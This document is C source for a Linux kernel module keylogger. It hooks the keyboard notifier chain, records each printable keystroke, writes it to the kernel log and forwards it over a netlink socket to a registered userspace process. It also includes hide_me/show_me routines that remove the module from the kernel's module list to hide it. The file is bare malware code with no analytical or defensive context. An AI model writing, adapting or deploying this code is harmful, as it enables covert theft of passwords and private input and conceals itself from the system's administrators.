#include "Module.h"
/* We need these for hiding/revealing the kernel module */
static struct list_head *prev_module;
struct sock *nl_sk = NULL;
int pid;
static struct notifier_block keylogger = {.notifier_call = notifier};
void show_me(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}
/* Record where we are in the loaded module list by storing
 * the module prior to us in prev_module, then remove ourselves
 * from the list */
void hide_me(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}
int notifier(struct notifier_block *block, unsigned long code, void *p)
{
    char key; 
    struct nlmsghdr *nlhead;
    struct sk_buff *skb_out;
    int res; 
    struct keyboard_notifier_param *param=(struct keyboard_notifier_param*) p;
    key=param->value;
    if((int)code == KBD_KEYSYM && param->down == 1 && key> 0x20 && key < 0x7f)
    {
        printk(KERN_INFO "Pressed %c\n",key);
        skb_out = nlmsg_new(1, 0);    
        if(!skb_out)
        {
            printk(KERN_ERR "Failed to allocate new skb\n");
            return 0;
        }
        nlhead = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, 1, 0);
        NETLINK_CB(skb_out).dst_group = 0;                 
        strncpy(nlmsg_data(nlhead), &key, 1); 
        res = nlmsg_unicast(nl_sk, skb_out, pid); 
        if(res < 0)
            printk(KERN_INFO "Error while sending back to user\n");
    }
    return 1;
}
static void mynetlink_recv_msg(struct sk_buff *skb)
{
    struct nlmsghdr *nlhead;
    printk(KERN_INFO "Entering: %s\n", __FUNCTION__);
    nlhead = (struct nlmsghdr*)skb->data;
    printk(KERN_INFO "MyNetlink has received: %s\n",(char*)nlmsg_data(nlhead));
    pid = nlhead->nlmsg_pid; 
}
static int __init mynetlink_init(void)
{
    struct netlink_kernel_cfg cfg = {
        .input = mynetlink_recv_msg,
    };
    register_keyboard_notifier(&keylogger);
    nl_sk = netlink_kernel_create(&init_net, MY_NETLINK, &cfg);
    if(!nl_sk)
    {
        printk(KERN_ALERT "Error creating socket.\n");
        return -10;
    }
    printk("MyNetLink Init OK!\n");
    return 0;
}

static void __exit mynetlink_exit(void)
{
    printk(KERN_INFO "exiting myNetLink module\n");
    netlink_kernel_release(nl_sk);
    unregister_keyboard_notifier(&keylogger);
}
module_init(mynetlink_init);
module_exit(mynetlink_exit);
MODULE_LICENSE("GPL");
